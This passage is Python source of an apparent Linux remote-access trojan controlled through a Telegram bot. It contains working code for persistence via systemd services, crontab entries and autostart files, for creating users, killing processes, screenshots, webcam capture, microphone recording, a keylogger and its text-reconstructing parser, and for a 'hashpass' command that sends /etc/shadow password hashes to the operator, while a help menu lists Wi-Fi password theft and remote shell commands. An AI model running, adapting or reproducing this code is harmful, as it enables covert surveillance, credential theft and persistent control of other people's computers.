        case 'get':
            out = shell('lsmod', output=True)

            if not out:
                return ''
            
            
            with StringIO(out) as buf, StringIO() as r:
                au = r.write

                for l in buf:
                    m  = l.split()
                    sz = len(m)

                    if (sz < 3) or not m[1].isdigit():
                        continue
                    
    
                    au(
f'''NAME   : {m[0]}
SIZE   : {m[1]} bytes
USED   : {m[2]}
MODULE : {m[3] if sz > 3 else NULL}
\n''')
                

                return r.getvalue()

        case 'installed':
            return shell(f'modprobe {quote(mod)}')
        
        case 'deleted':
            return shell(f'modprobe -r {quote(mod)}')
 



def systemctl(
    c, 
    name=None, description=None,
    path=None, args='none', 
        root=True, 
    *, 
    _reload=True
):
    if not _isdir(PATH_SYSTEMCTL):
        raise RuntimeError('systemctl is not working')
    

    init_user()


    def exist():
        return shell(f'systemctl status {quote(name)}')
        
        
    match c:
        case 'get':
            with StringIO() as buf:
                try:
                    units = json(shell('systemctl list-units --type=service --all --output=json', output=True))
                except Exception:
                    return ''


                au = buf.write

                for u in units:
                    au(
f'''NAME        : {u.get("unit",    NULL)}
DESCRIPTION : {u.get("description", NULL)}
LOAD        : {u.get("load",        NULL).upper()}
SUB         : {u.get("sub",         NULL).upper()}
STATUS      : {u.get("active",      NULL).upper()}
\n''')


                return buf.getvalue()
            
        case 'query':
            if not exist():
                return ''

            stat = shell(f'systemctl status {quote(name)}', output=True)
            show = shell(f'systemctl show {quote(name)}',   output=True)

            return f'{stat}\n\n{show}'
        
        case 'update':
            return shell('systemctl daemon-reload')
        
        case 'create':
            if _exist(path):
                path = _absp(path)

            write_file(f'{PATH_SYSTEMCTL}/{name}.service', 
f'''[Unit]
Description={description}

[Service]
Type=simple
ExecStart={quote(path)} {"" if args == "none" else args}
User={"root" if root else LOGGED_USER}
Restart=always

[Install]
WantedBy=multi-user.target
''')

            shell(f'systemctl enable {quote(name)}')

            if _reload:
                shell('systemctl daemon-reload')
            

            return f'service is created ({name}) [+]'
        
        case 'delete':
            if not exist():
                return f'service does not exist ({name}) [*]'
            

            shell(f'systemctl disable {quote(name)}')
            shell(f'systemctl stop {quote(name)}')


            for p in (
                f'/etc/systemd/system/{name}.service',   
                f'/lib/systemd/system/{name}.service',   
                f'/usr/lib/systemd/system/{name}.service',  
                f'/home/{LOGGED_USER}/.config/systemd/user/{name}.service'
            ):
                if _isfile(p):
                    _remove(p)
                    break
            
            shell('systemctl daemon-reload')
                

            return f'service is deleted ({name}) [+]'
        
        case 'enable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return (
                    f'service is enabled ({name}) [+]' 
                if shell(f'systemctl enable {quote(name)}') else 
                    f'failed to enable service ({name}) [-]'
            )
        
        case 'disable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return (
                    f'service is disabled ({name}) [+]' 
                if shell(f'systemctl disable {quote(name)}') else 
                    f'failed to disable service ({name}) [-]'
            )
        
        case 'start':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return (
                    f'service is started ({name}) [+]' 
                if shell(f'systemctl start {quote(name)}') else 
                    f'failed to start service ({name}) [-]'
            )
        
        case 'restart':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return (
                    f'service is restarted ({name}) [+]' 
                if shell(f'systemctl restart {quote(name)}') else 
                    f'failed to restart service ({name}) [-]'
            )
        
        case 'stop':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return (
                    f'service is stopped ({name}) [+]' 
                if shell(f'systemctl stop {quote(name)}') else 
                    f'failed to stop service ({name}) [-]'
            )




def crontab(
    c, 
    name=None, 
    event=None, root=True, 
    path=None,  args='none',
    *,
    _sep='#='
):
    if not _isfile(PATH_CRONTAB):
        raise RuntimeError('cron is not working')
    

    init_user()
    

    match c:
        case 'get':
            with StringIO(read_file(PATH_CRONTAB)) as buf, StringIO() as r:
                for l in buf:
                    i = l.split(_sep)
                    
                    if len(i) != 2:
                        continue

                    r.write(f'NAME : {i[1].strip()}\nTASK : {i[0].strip()}\n')
            

                return r.getvalue()
        
        case 'create':
            if _exist(path):
                path = _absp(path)


            lb   = f'{_sep}{name}'
            task = f'{event} {"root" if root else LOGGED_USER} {quote(path)} {"" if args == "none" else args} {lb}'


            return (
                    f'task is created ({name}) in crontab [+]' 
                if change_file(PATH_CRONTAB, lb, task) else 
                    f'failed to create task ({name}) in crontab [-]'
            )
        
        case 'delete':
            lb = f'{_sep}{name}'
            return (
                    f'task is deleted ({name}) in crontab [+]' 
                if change_file(PATH_CRONTAB, lb, lb, delete=True) else 
                    f'failed to delete task ({name}) in crontab [-]'
            )




def startup(
    c, 
    name=None, path=None, args='none',
    *,
    _lb='.desktop'
):
    init_user()


    if not _isdir(PATH_CONF_STARTUP):
        shell(f'sudo -u {LOGGED_USER} mkdir -p {PATH_CONF_STARTUP}')

    if not _isdir(PATH_CONF_STARTUP):
        raise RuntimeError(f'startup is not working') 
     

    match c:
        case 'get':
            with StringIO() as buf:
                sc = _scandir(PATH_CONF_STARTUP)

                for e in sc:
                    n = e.name

                    if not n.endswith(_lb):
                        continue

                    buf.write(f'NAME : {n[: -8]}\n')
                

                sc.close()
                return buf.getvalue()
        
        case 'create':
            if _exist(path):
                path = _absp(path)


            p = f'{PATH_CONF_STARTUP}/{name}{_lb}'

            write_file(p, 
f'''[Desktop Entry]
Type=Application
Exec={quote(path)} {"" if args == "none" else args}
Name={name}
''')    
            os.chmod(p, 0o755)
            

            return f'created ({name}) in startup [+]'
        
        case 'delete':
            p = f'{PATH_CONF_STARTUP}/{name}{_lb}'

            if _isfile(p):
                _remove(p)
                return f'deleted ({name}) in startup [+]'
            else:
                return f'file does not exist ({name}) in startup [*]'
        
        case 'start':
            p = f'{PATH_CONF_STARTUP}/{name}{_lb}'

            if not _isfile(p):
                return f'file does not exist ({name}) in startup [*]'

            return (
                    f'started ({name}) in startup [+]' 
                if shell(f'xdg-open {quote(p)}') else 
                    f'failed to start ({name}) in startup [-]'
            )




def env(c, ekey=None, evalue=None):
    if not _isfile(PATH_ENVIRONMENT):
        raise RuntimeError(f'environment is not working')  
    

    match c:
        case 'get' | 'query':
            with StringIO(read_file(PATH_ENVIRONMENT)) as out, StringIO() as buf:
                for l in out:
                    i = l.split('=', 1)

                    if len(i) != 2:
                        continue


                    name, val = i


                    idx = val.rfind('#')

                    if idx != -1:
                        val = val[: idx].rstrip()


                    if (c == 'query') and (ekey == name):
                        return f'{name}={val}\n'
                    else: 
                        buf.write(f'{name}={val}\n')


                if c == 'query':
                    return ''
                
                return buf.getvalue()
            
        case 'create':
            lb = f'{ekey}={evalue}'
            return (
                    f'environment key is created ({lb}) [+]' 
                if change_file(PATH_ENVIRONMENT, ekey, lb) else 
                    f'failed to create environment key ({ekey}) [-]'
            )
        
        case 'delete':
            return (
                    f'environment key is deleted ({ekey}) [+]' 
                if change_file(PATH_ENVIRONMENT, ekey, ekey, delete=True) else 
                    f'environment key does not exist ({ekey}) [*]'
            )




def user(c, name=None, password='none'):
    match c:
        case 'get':
            return get_user(name)

        case 'create':
            uad = shell(f'useradd {name}')


            if password != 'none':
                try:
                    sp_run(f'passwd {name}', input=f'{password}\n{password}', 
                           text=True, stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except Exception:
                    return f'failed to set user ({name}) password ({password}) [*]'
                

            return (
                    f'user is created ({name}) [+]' 
                if uad else 
                    f'failed to create user ({name}) [-]'
            )
        
        case 'delete':
            return (
                    f'user is deleted ({name}) [+]' 
                if shell(f'userdel {name}') else 
                    f'failed to delete user ({name}) [-]'
            )




def app_blocker():
    sep = '='

    while True:
        sleep(3)

        if not _isfile(FILE_APP_BLOCKER):
            continue
        

        try:

            out = read_file(FILE_APP_BLOCKER)

            if not out:
                continue

            
            with StringIO(decrypt(out)) as buf:
                for l in buf:
                    n = l.split(sep)

                    if len(n) == 2:
                        kill(n[0])

        except Exception:
            continue




def ps():
    with StringIO() as r:
        au = r.write

        for i in psutil.process_iter((
            'pid',            'name',           'username', 
            'cpu_percent',    'memory_info',    'create_time',    
                              'status'
        )):
            pg = i.info.get


            pid = pg('pid',         NULL)
            cpu = pg('cpu_percent', NULL)
            pmm = pg('memory_info', NULL)
            tim = pg('create_time', NULL)


            if (cpu != NULL) and (cpu is not None):
                cpu = f'{int(cpu)}%'

            if (pmm != NULL) and (pmm.rss is not None):
                pmm = f'{pmm.rss >> 10} KiB'

            if (tim != NULL) and (tim is not None):
                t    = int(time() - tim)
                h, t = divmod(t, 3600)
                m, s = divmod(t, 60)

                tim = f'{h:02d}:{m:02d}:{s:02d}'


            au(
f'''PID    : {pid}
NAME   : {pg("name",     NULL)}
USER   : {pg("username", NULL)}
CPU    : {cpu}
MEMORY : {pmm}
TIME   : {tim}
STATUS : {pg("status", NULL).upper()}
\n''')
            

            
        return r.getvalue()




def kill(p):
    if p.isdigit():
        try:
            psutil.Process(int(p)).kill()
            return True
        except Exception: 
            return False
        
    
    return shell(f'pkill -9 {quote(p)}')




def launch(path, args):
    if not _exist(path):
        path = os.path.join(PATH_SHARE, path)

        if not _exist(path):
            return None
        

    try:

        c = (
                [_absp(path)] 
            if os.access(path, os.X_OK) else 
                ['xdg-open', _absp(path)]
        ) + split_args(args)

        Popen(c, stdout=DEVNULL, stderr=DEVNULL, start_new_session=True) 


        return True
    except Exception:
        return False
    



def screenshot():
    try:

        with mss() as m:
            i = m.grab(m.monitors[0])
            return mem(to_png(i.rgb, i.size))
        
    except Exception:
        return None




def webcam_screenshot():
    try:

        (ffmpeg
            .input(
                '/dev/video0',
                format='v4l2',
                framerate=30,
                video_size='640x480'   
            )
            .output(
                FILE_WEBCAM_SCREENSHOT,
                vframes=1,
                format='image2',       
                vcodec='png'          
            )
            .overwrite_output()
            .run(quiet=True)
        )


        b = read_file(FILE_WEBCAM_SCREENSHOT, b=True)

        if _isfile(FILE_WEBCAM_SCREENSHOT):
            _remove(FILE_WEBCAM_SCREENSHOT)


        return b
    except Exception:
        return None




def get_audio_alsa(output=False):
    deft = ('default', 'pulse')
    typ  = 'output' if output else 'input'
    


    out = shell(f'pactl list {"sinks" if output else "sources"} short', output=True)

    if out:
        with StringIO(out) as buf:
            for l in buf:
                i = l.split()

                if len(i) < 3:
                    continue


                dev = i[1].strip()

                if typ in dev:
                    return (dev, 'pulse')
            

        
    out = shell('pw-cli ls Node', output=True)

    if not out:
        return deft


    with StringIO(out) as buf:
        lb = 'node.name'

        for l in buf:
            i = l.split()

            if (len(i) != 3) or (i[0] != lb):
                continue


            dev = i[-1].replace('"', '').strip()

            if typ in dev:
                return (dev, 'pipewire')



    return deft
    



def audio(mode, s):
    dev, typ = get_audio_alsa(mode == 'system')

    try:

        (ffmpeg
            .input(dev, format=typ, t=s)  
            .output(FILE_AUDIO, acodec='libmp3lame')
            .overwrite_output()
            .run(quiet=True)
        )


        b = read_file(FILE_AUDIO, b=True)

        if _isfile(FILE_AUDIO):
            _remove(FILE_AUDIO)


        return b
    except Exception:
        return None




def keylogger():
    kre = kb.read_event


    cap = 'down'
    sep = '\u200F'


    buf = StringIO()
    au  = buf.write
    sz  = 0


    while True:
        sleep(3)

        try:

            if (
                not _isfile(FILE_KEYLOGGER_FLAG) or 
                (read_file(FILE_KEYLOGGER_FLAG) != '1')
            ):
                continue
            

            while True:
                if sz >= KEYLOGGER_BUFFER_SIZE:
                    with open(FILE_KEYLOGGER, 'a', encoding=FILE_ENCODING) as f:
                        f.write(f'{encrypt(buf.getvalue())}\n') 
                        f.flush()
                        

                    buf.seek(0)      
                    buf.truncate(0)
                    sz = 0


                    if (
                        not _isfile(FILE_KEYLOGGER_FLAG) or 
                        (read_file(FILE_KEYLOGGER_FLAG) != '1')
                    ):
                        break
        


                e = kre()
                
                if e.event_type != cap:
                    continue

                
                au(f'{e.name}{sep}')
                sz += 1
                
        except Exception:
            continue




def keylogger_parser(mode):
    if not _isfile(FILE_KEYLOGGER):
        return b''
    


    _mdbs = mode == 'base'
    _mdch = mode == 'char'
    _mdhk = mode == 'hotkey'
    _mdnh = mode == 'no hotkey'



    _sep  = '\u200F'
    _isp  = str.isspace
    _ctrl = '[CTRL]'



    _HOTKEY  = {'backspace': '[BACKSPACE]', 'enter': '[ENTER]', 'space': '[SPACE]', 'ctrl': '[CTRL]', 'left ctrl': '[LEFT CTRL]', 'right ctrl': '[RIGHT CTRL]', 'shift': '[SHIFT]', 'left shift': '[LEFT SHIFT]', 'right shift': '[RIGHT SHIFT]', 'alt': '[ALT]', 'left alt': '[LEFT ALT]', 'right alt': '[RIGHT ALT]', 'tab': '[TAB]', 'caps lock': '[CAPS LOCK]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]', 'insert': '[INSERT]', 'home': '[HOME]', 'page up': '[PAGE UP]', 'page down': '[PAGE DOWN]', 'delete': '[DELETE]', 'decimal': '[DECIMAL]', 'end': '[END]', 'print screen': '[PRINT SCREEN]', 'scroll lock': '[SCROLL LOCK]', 'pause': '[PAUSE]', 'num lock': '[NUM LOCK]', 'clear': '[CLEAR]', 'esc': '[ESC]', 'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]', 'windows': '[WINDOWS]', 'left windows': '[LEFT WINDOWS]', 'right windows': '[RIGHT WINDOWS]', 'num 0': '[NUM 0]', 'num 1': '[NUM 1]', 'num 2': '[NUM 2]', 'num 3': '[NUM 3]', 'num 4': '[NUM 4]', 'num 5': '[NUM 5]', 'num 6': '[NUM 6]', 'num 7': '[NUM 7]', 'num 8': '[NUM 8]', 'num 9': '[NUM 9]', 'num enter': '[NUM ENTER]', 'num +': '[NUM +]', 'num -': '[NUM -]', 'num *': '[NUM *]', 'num /': '[NUM /]', 'media play/pause': '[MEDIA PLAY/PAUSE]', 'media stop': '[MEDIA STOP]', 'media next': '[MEDIA NEXT]', 'media prev': '[MEDIA PREV]', 'volume up': '[VOLUME UP]', 'volume down': '[VOLUME DOWN]', 'mute': '[MUTE]'}.get
    _SPECIAL = {'[ENTER]': '\n', '[SPACE]': ' ', '[TAB]': '\t'}.get



    def is_char(c, *, _bs='[', _be=']'):
        return not ( (c[0] == _bs) and (c[-1] == _be) )
     

    def push_key(k):
        nonlocal pos
        bph(pos, k)
        pos += 1
    
    

    with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f, BytesIO() as out:
        for l in f:
            try:
                dt = decrypt(l).split(_sep)
            except Exception:
                break


            pos = 0
            buf = []
            bpp = buf.pop
            bph = buf.insert
            bgt = buf.__getitem__


            for k in dt: 
                hotkey = _HOTKEY(k)

                if hotkey is None:
                    push_key(k)
                    continue


                if _mdbs or _mdch:
                    push_key(_SPECIAL(
                        hotkey, 
                        '' if _mdch else hotkey
                    ))
                    continue
                

                bln = len(buf)

                match hotkey:
                    case '[HOME]': 
                        pos = 0
                    
                    case '[END]': 
                        pos = bln

                    case '[BACKSPACE]':
                        if pos <= 0:
                            continue 


                        pv = bgt(pos - 1)

                        if is_char(pv):
                            pos -= 1
                            bpp(pos)

                    case '[DELETE]':
                        if pos >= bln:
                            continue 


                        nx = bgt(pos)

                        if is_char(nx):
                            bpp(pos)

                    case '[LEFT]':
                        if pos <= 0:
                            continue


                        pv = bgt(pos - 1)

                        if pv == _ctrl:
                            while (
                                (pos > 0) and 
                                (bgt(pos - 1) == _ctrl)
                            ):
                                bpp(pos - 1)
                                pos -= 1

                            while (
                                (pos > 0) and 
                                (_isp( bgt(pos - 1) ) or 
                                 not is_char(bgt(pos - 1)))
                            ):
                                pos -= 1

                            while (
                                (pos > 0) and 
                                (not _isp( bgt(pos - 1) ) and 
                                 is_char(bgt(pos - 1)))
                            ):
                                pos -= 1
                        
                        else:
                            pos -= 1

                    case '[RIGHT]':
                        if pos >= bln:
                            continue


                        cur = bgt(pos - 1)

                        if cur == _ctrl:
                            while (
                                (pos < bln) and 
                                (bgt(pos - 1) == _ctrl)
                            ):
                                bpp(pos - 1)
                                pos -= 1

                            while (
                                (pos < bln) and 
                                _isp( bgt(pos) )
                            ):
                                pos += 1

                            while (
                                (pos < bln) and 
                                is_char(bgt(pos)) and not _isp( bgt(pos) )
                            ):
                                pos += 1
                        
                        else:
                            pos += 1

                    case '[CTRL]':
                        push_key(_ctrl)  

                    case _:
                        push_key(_SPECIAL(
                            hotkey, 
                            hotkey if _mdhk else ''
                        ))


            
            bln = len(buf)
            pos = pos if bln > pos else bln
            buf = mem((
                    ''.join(k for k in buf if k != _ctrl)
                if _mdnh else
                    ''.join(buf)
            ).encode())

                
            out.write(buf)



        return mem(out.getvalue())




def execute(cmd, send):
    match cmd.lower():
        case 'author': 
            send('''
Hello, welcome to my project!
This project is designed for remote computer access.
This version is (TELEGRAM BOT)
My name is Vladislav Khudash (17).
You can contact me on GitHub: https://github.com/vk-candpython
''')
            return
        
        case 'help':
            send('''Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    repeat                    Repeat command
    session                   About this session
    getpid                    Current pid
    getuid                    Current user
    setuid                    Set current user UID
    config                    Bot config control
    account                   Control accounts connected to this computer
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in directory    
    mkfile                    Create file               
    mkdir                     Create dir              
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    chmod                     Change file or dir mode
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    zip                       Make archive directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    dmesg                     Get kernel messages                                                                            
    systeminfo                Get information about computer  
    lshw                      Get information about computer using lshw
    modprobe                  Modprobe utilities
    service                   Service utilities 
    crontab                   Crontab utilities 
    startup                   Startup utilities   
    env                       Environment utilities
    user                      User utilities                 
    block                     Block app utilities    
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Execute command in shell     
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    hashpass                  Dump contents of SHADOW database
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Take screenshot of screen 
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    msg                       Display message                     
    keylogger                 Keylogger utilities   
''', doc='help.txt')
            return
        
        case 'repeat':
            send('repeat (command) -c (amount) -d (second)  —  Repeat command')
            return
        
        case 'getpid':
            send(str(PID))
            return
        
        case 'getuid':
            init_user()
            send(f'{NODE}\\\\{USER}\nLOGGED : {LOGGED_USER}')
            return
        
        case 'setuid':
            send('setuid (uid)  —  Set current UID for bot')
            return
        
        case 'config':
            send('''
config -g  —  Get current bot config\n
config (TOKEN|PASSWORD|SEED) -s (value)  —  Set config option\n
config -r (TOKEN|PASSWORD|SEED)  —  Reset config option
''')
            return
        
        case 'account':
            send('account -g  —  Get accounts connected to session\n\naccount -d (id)  —  Delete account connected to session')
            return
        
        case 'autostart':
            send('''
autostart -l  —  Get information about bot autostart\n
autostart -c (name) -p (path) -a (none|args)  —  Create file in bot autostart\n
autostart -d (name)  —  Delete file in bot autostart\n
autostart -r  —  Reset bot autostart
''')
            return
        
        case 'restart':
            if _isfile(__file__):
                send('bot is restarted [+]')
                os.execv(FILE_PYTHON, [FILE_PYTHON, __file__])
            else:
                send('failed to restart bot [-]')

            return
        
        case 'pwd':
            send(os.getcwd())
            return
        
        case 'cd':
            send('cd (path)  —  Change directory')
            return
        
        case 'ls':
            r = ls()

            send(f'DIRECTORY : {os.getcwd()}\n{r}', doc='ls.txt') if r else send(NULL)
            return
        
        case 'mkfile':
            send('mkfile (path) -d (data)  —  Create file')
            return
        
        case 'mkdir':
            send('mkdir (path)  —  Create dir')
            return
        
        case 'rn':
            send('rn (name) -n (new_name)  —  Rename file or dir')
            return
        
        case 'rm':
            send('rm (path)  —  Delete file')
            return
        
        case 'rmdir':
            send('rmdir (path)  —  Delete dir')
            return
        
        case 'cp':
            send('cp (from_path) -t (to_path)  —  Copy file or dir')
            return
        
        case 'mv':
            send('mv (from_path) -t (to_path)  —  Move file or dir')
            return
        
        case 'chmod':
            send('chmod (path) -m (number)  —  Change file or dir mode')
            return
        
        case 'hide':
            send('hide (path)  —  Hide file or dir')
            return
        
        case 'unhide':
            send('unhide (path)  —  Unhide file or dir')
            return
        
        case 'cat':
            send('cat (path)  —  Download file')
            return
        
        case 'zip':
            cur = f'{_namep(os.getcwd())}.zip'

            try:
                dt = make_zip()
                send(dt, doc=cur)
            except Exception:
                send(f'failed to make archive ({cur}) [-]') 

            return
        
        case 'inet':
            send('inet -e  —  Enable Internet\n\ninet -d  —  Disable Internet')
            return
        
        case 'ipconfig':
            r = ipconfig()

            send(r, doc='ipconfig.txt') if r else send(NULL)
            return
        
        case 'route':
            r = route()

            send(r, doc='route.txt') if r else send(NULL)
            return 
        
        case 'arp':
            r = arp()

            send(r, doc='arp.txt') if r else send(NULL)
            return
        
        case 'netstat':
            r = netstat()

            send(r, doc='netstat.txt') if r else send(NULL)
            return
        
        case 'wifi':
            send('wifi -g  —  Find Wi-Fi\n\nwifi -p  —  Get Wi-Fi password')
            return
        
        case 'site':
            send('''
site -p (url)  —  Open website\n
site -d (url) -n (name)  —  Download file from website\n
site -l  —  Get blocked sites\n
site -b (domain)  —  Block site\n
site -d (domain)  —  Unblock site\n
site -r  —  Unblock all sites
''')
            return
        
        case 'dmesg':
            r = shell('dmesg -T', output=True)

            send(r, doc='dmesg.txt') if r else send(NULL)
            return
        
        case 'systeminfo':
            r = systeminfo()

            send(r, doc='systeminfo.txt') if r else send(NULL)
            return
        
        case 'lshw':
            r = shell('lshw', output=True)

            send(r, doc='lshw.txt') if r else send('lshw is not working [*]')
            return
        
        case 'modprobe':
            send('''
modprobe -g  —  Get modules\n
modprobe -i (name)  —  Install module\n
modprobe -d (name)  —  Delete module
''')
            return
        
        case 'service':
            send('''
service -g  —  Get information about services\n
service -q (name)  —  Get information about service\n
service -u  —  Update services\n
service -c (name) -d (description) -p (path) -a (args) -u (root|user)  —  Create service\n
service -d (name)  —  Delete service\n
service -e (name)  —  Enable service\n
service -i (name)  —  Disable service\n
service -l (name)  —  Start service\n
service -r (name)  —  Restart service\n
service -s (name)  —  Stop service
''')
            return 
        
        case 'crontab':
            send('''
crontab -g  —  Get tasks from crontab\n            
crontab -c (name) -e (event) -u (root|user) -p (path) -a (none|args)  —  Create task in crontab\n
crontab -d (name)  —  Delete task from crontab
''')
            return
        
        case 'startup':
            send('''
startup -g  —  Get information about startup\n
startup -c (name) -p (path) -a (none|args)  —  Create file in startup\n
startup -d (name)  —  Delete file in startup\n
startup -l (name)  —  Start file in startup
''')
            return
        
        case 'env':
            send('''
env -g  —  Get environment\n
env -q (key)  —  Get value of environment key\n
env -c (key) -v (value)  —  Create environment key\n
env -d (key)  —  Delete environment key\n
env -b  —  Get bot environment\n
env -g (key)  —  Get value of bot environment key\n
env -s (key) -v (value)  —  Set bot environment key
''')
            return
        
        case 'user':
            send('''
user -g  —  Get information about users\n
user -q (name)  —  Get information about user\n
user -c (name) -p (none|password)  —  Create user\n
user -d (name)  —  Delete user
''')
            return
        
        case 'block':
            send('''
block -l  —  Get blocked apps\n
block -b (name)  —  Block app\n
block -d (name)  —  Unblock app\n
block -r  —  Unblock all apps
''')
            return
        
        case 'ps':
            r = ps()

            send(r, doc='ps.txt') if r else send(NULL)
            return
        
        case 'kill':
            send('kill (pid|name)  —  Terminate process')
            return
        
        case 'run':
            send('run (path) -a (none|args)  —  Launch file')
            return
        
        case 'cmd':
            send('cmd -e (command)  —  Cmd execute command without output\n\ncmd -g (command)  —  Cmd execute command with output')
            return
        
        case 'time':
            send('time -g  —  Get time\n\ntime -s (time)  —  Set time')
            return
        
        case 'date':
            send('date -g  —  Get date\n\ndate -s (date)  —  Set date')
            return
        
        case 'sleep':
            shell('systemctl suspend')
            return
        
        case 'reboot':
            shell('reboot')
            return
        
        case 'shutdown':
            shell('poweroff')
            return
        
        case 'hashpass':
            try:
                send(read_file(PATH_SHADOW), doc='hashpass.txt')
            except Exception:
                send('failed to hashpass [-]')

            return
        
        case 'mouse':
            send('''
mouse -p  —  Get current mouse position\n
mouse -x (coordinate) -y (coordinate) -d (delay)  —  Move mouse\n
mouse -l|-r|-m -c (click) -d (delay)  —  Click mouse button\n
mouse -s (amount)  —  Mouse scroll
''')
            return
        
        case 'keyboard':
            send('''
keyboard -t (text) -d (second)  —  Type on keyboard\n
keyboard -k (key) -p (amount) -d (second)  —  Press key or hotkey on keyboard\n
keyboard -c -k|-h (key) -n (new_key)  —  Remap key or hotkey on keyboard\n
keyboard -b (key)  —  Block key or hotkey on keyboard\n
keyboard -r  —  Reset keyboard settings
''')
            return
        
        case 'clipboard':
            send('''
clipboard -g  —  Get data from clipboard\n
clipboard -c (data)  —  Copy data to clipboard\n
clipboard -r  —  Clear clipboard
''')
            return
        
        case 'screen':
            png = screenshot()

            send(png, doc='screenshot.png') if png else send('failed to take screenshot [-]')
            return
        
        case 'webcam':
            png = webcam_screenshot()

            send(png, doc='webcam.png') if png else send('failed to take screenshot from webcam [-]')
            return
        
        case 'audio':
            send('audio (-m|-p) (second)  —  Record audio\n\naudio -s (path)  —  Play audio')
            return
        
        case 'msg':
            send('msg (-p|-s) (title) -t (text)  —  Display message')
            return
        
        case 'keylogger':
            send('''
keylogger -g (base|char|hotkey|no hotkey)  —  Get keylogger data\n
keylogger -e  —  Enable keylogger\n
keylogger -d  —  Disable keylogger\n
keylogger -s  —  Keylogger status\n
keylogger -r  —  Reset keylogger data
''')
            return
        


    _c = cmd.split(maxsplit=1)

    if len(_c) != 2:
        send(f'command not found ({cmd})')
        return
    
    args = _c[1]



    match _c[0].lower():
        case 'repeat': 
            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                command, amount, delay = exp['command'], int(exp['amount']), int(exp['delay'])

                if amount <= 0:
                    send(f'invalid amount ({amount}) [*]')
                    return


                send(f'started repeating ({command}) -c ({amount}) -s ({delay}) [*]')


                for n in range(1, amount + 1):
                    try:
                        execute(command, send)
                        send(f'command is repeated {n} ({command}) [+]')
                    except Exception as er:
                        send(f'failed to repeat command {n} ({command}) [-]\n\n{type(er).__name__}({er})')
           
                    sleep(delay)


                send(f'end of repeat command ({command}) -c ({amount}) -s ({delay}) [*]')
                return
            
        case 'setuid':
            if exp := parse_cmd(r'(\d+)', args):
                uid = int(exp['uid'])


                try:
                    getpwuid(uid)
                except (KeyError, OSError):
                    send(f'UID does not exist ({uid}) [*]')
                    return

                try:
                    os.seteuid(uid)
                    send(f'UID is set ({uid}) [+]')
                except OSError:
                    send(f'failed to set UID ({uid}) [-]')


                return
            
        case 'config':
            if args == '-g':
                send(f'''
#-------------------------|NECESSARILY|-------------------------#
TOKEN = {TOKEN}
PASSWORD = {PASSWORD}
SEED = {SEED}
PATH = {PATH}
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = {BOT_FILE_NAME}
BOT_SERVICE_NAME = {BOT_SERVICE_NAME}
BOT_SERVICE_DESCRIPTION = {BOT_SERVICE_DESCRIPTION}
BOT_EXE = {BOT_EXE}
#----------------------------|END|---------------------------#
''')
                return
            
            elif exp := parse_cmd(r'(?P<const>TOKEN|PASSWORD|SEED)\s*-s\s*(?P<value>.+)', args):
                value = exp['value'] 
            
                match exp['const']:
                    case 'TOKEN':
                        ok = http(GETME_URL.format(value), json=True).get('ok')

                        if not ok:
                            send('Telegram bot (TOKEN) is invalid')
                            return


                        write_file(CONFIG_TOKEN, encrypt(value))
                        send(f'TOKEN is changed ({TOKEN}) --> ({value}) [+]')

                    case 'PASSWORD':
                        value = sha256(value.encode()).hexdigest()

                        write_file(CONFIG_PASSWORD, encrypt(value))
                        send(f'PASSWORD is changed ({PASSWORD}) --> ({value}) [+]')
                    
                    case 'SEED':
                        if not value.isdigit():
                            send('(SEED) is invalid')
                            return
                        
                        if int(value) < 0:
                            send('(SEED) must be >= 0')
                            return
                        

                        write_file(CONFIG_SEED, value)
                        send(f'SEED is changed ({SEED}) --> ({value}) [+]')
                        

                        
                return
            
            elif exp := parse_cmd(r'-r\s*(?P<const>TOKEN|PASSWORD|SEED)', args):
                match exp['const']:
                    case 'TOKEN':
                        if _isfile(CONFIG_TOKEN):
                            _remove(CONFIG_TOKEN)
                            send('reset (TOKEN) [+]')

                    case 'PASSWORD':
                        if _isfile(CONFIG_PASSWORD):
                            _remove(CONFIG_PASSWORD)
                            send('reset (PASSWORD) [+]')

                    case 'SEED':
                        if _isfile(CONFIG_SEED):
                            _remove(CONFIG_SEED)
                            send('reset (SEED) [+]')

                return
            
        case 'account':
            if args == '-g':
                r = []

                
                for (k, v) in SESSION.items():
                    try:
                        p    = f'{PATH_MEM}/{mem_id(k)}'
                        regd = decrypt(read_file(p))
                    except Exception:
                        regd = NULL

                    r.append((
                        k,       v[0],
                        v[1],    regd
                    ))
                
                
                send(tabulate(
